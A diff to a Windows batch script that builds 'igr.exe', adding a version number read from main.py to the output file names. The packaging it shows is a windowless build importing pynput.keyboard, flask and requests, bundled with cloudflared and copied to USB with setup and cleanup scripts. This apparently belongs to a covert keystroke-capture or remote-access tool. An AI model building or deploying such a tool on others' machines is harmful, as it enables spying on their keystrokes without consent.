@@ -1,7 +1,11 @@
 @echo off
 setlocal enabledelayedexpansion
+REM Read version from main.py
+set "IGR_VERSION="
+for /f "tokens=2 delims==\"" %%v in ('findstr /c:"IGR_VERSION" main.py 2^>nul') do set "IGR_VERSION=%%~v"
+if not defined IGR_VERSION set "IGR_VERSION=6"
 echo ============================================
-echo   IGR Build - Compiling executable
+echo   IGR v%IGR_VERSION% Build - Compiling executable
 echo ============================================
 echo.
 
@@ -82,8 +86,8 @@ if not exist cloudflared.exe (
 )
 
 echo.
-echo [5/6] Compiling igr.exe...
-python -m PyInstaller --onefile --noconsole --name igr --clean --noconfirm ^
+echo [5/6] Compiling igr_v%IGR_VERSION%.exe...
+python -m PyInstaller --onefile --noconsole --name igr_v%IGR_VERSION% --clean --noconfirm ^
     --hidden-import flask ^
     --hidden-import requests ^
     --hidden-import pynput.keyboard ^
@@ -101,9 +105,9 @@ python -m PyInstaller --onefile --noconsole --name igr --clean --noconfirm ^
 REM Clean up build copy
 del /f /q "main_build.py" >nul 2>&1
 
-if not exist "dist\igr.exe" (
+if not exist "dist\igr_v%IGR_VERSION%.exe" (
     echo.
-    echo ERROR: Build failed - igr.exe not found in dist\
+    echo ERROR: Build failed - igr_v%IGR_VERSION%.exe not found in dist\
     pause
     exit /b 1
 )
@@ -125,11 +129,11 @@ if %USB_COUNT%==0 (
     echo ============================================
     echo   BUILD SUCCESSFUL
     echo ============================================
-    echo   Output: dist\igr.exe
+    echo   Output: dist\igr_v%IGR_VERSION%.exe
     echo.
     echo   Manually copy to USB:
     echo     USB root:       setup.bat, cleanup.bat
-    echo     USB\subfiles\:   igr.exe, cloudflared.exe
+    echo     USB\subfiles\:   igr_v%IGR_VERSION%.exe, cloudflared.exe
     echo ============================================
     echo.
     pause
@@ -149,7 +153,7 @@ if "%USB_CHOICE%"=="0" (
     echo ============================================
     echo   BUILD SUCCESSFUL
     echo ============================================
-    echo   Output: dist\igr.exe
+    echo   Output: dist\igr_v%IGR_VERSION%.exe
     echo ============================================
     echo.
     pause
@@ -182,7 +186,7 @@ if "%USB_MODE%"=="1" (
 echo.
 echo   Copying files to %USB_DRIVE% ...
 if not exist "%USB_DRIVE%\subfiles" mkdir "%USB_DRIVE%\subfiles"
-copy /y "dist\igr.exe" "%USB_DRIVE%\subfiles\igr.exe" >nul
+copy /y "dist\igr_v%IGR_VERSION%.exe" "%USB_DRIVE%\subfiles\igr.exe" >nul
 copy /y "cloudflared.exe" "%USB_DRIVE%\subfiles\cloudflared.exe" >nul
 copy /y "setup.bat" "%USB_DRIVE%\setup.bat" >nul
 echo   Done.
@@ -205,7 +209,7 @@ echo ============================================
 echo   USB: %USB_DRIVE%
 echo     Root:       setup.bat
 if "%CLEANUP_COPIED%"=="1" echo     Root:       cleanup.bat
-echo     subfiles\:  igr.exe, cloudflared.exe
+echo     subfiles\:  igr_v%IGR_VERSION%.exe -^> igr.exe, cloudflared.exe
 echo ============================================
 echo.
 pause
